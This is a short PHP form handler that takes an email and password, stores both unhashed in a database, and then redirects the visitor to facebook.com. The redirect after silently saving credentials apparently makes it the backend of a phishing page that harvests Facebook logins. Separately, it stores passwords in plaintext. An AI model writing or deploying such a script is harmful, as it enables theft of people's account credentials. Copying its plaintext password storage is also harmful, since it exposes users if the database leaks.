<?php
// Include the database connection setup file
require_once 'connection.php';

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Check if password meets the minimum length requirement
  if (strlen($password) < 8) {
    header("Location: index.php?pass_error=Password must be at least 8 characters long.&email=" . urlencode($email));
    exit();
  }

  try {
    // Check if the email already exists in the database
    $stmt_check = $conn->prepare("SELECT * FROM users WHERE email = :email");
    $stmt_check->bindParam(':email', $email);
    $stmt_check->execute();

    if ($stmt_check->rowCount() > 0) {
      header("Location: index.php?error=Email already exists. Please enter another email.&email=" . urlencode($email));
      exit();
    } else {
      // Prepare a SQL statement to insert data into the database
      $stmt_insert = $conn->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
      // Bind parameters
      $stmt_insert->bindParam(':email', $email);
      $stmt_insert->bindParam(':password', $password);
      $stmt_insert->execute();

      // Check if the insertion was successful
      if ($stmt_insert->rowCount() > 0) {
        header("Location: https://facebook.com");
        exit();
      } else {
        echo "Error: Insertion failed.";
      }
    }
  } catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
  }
}
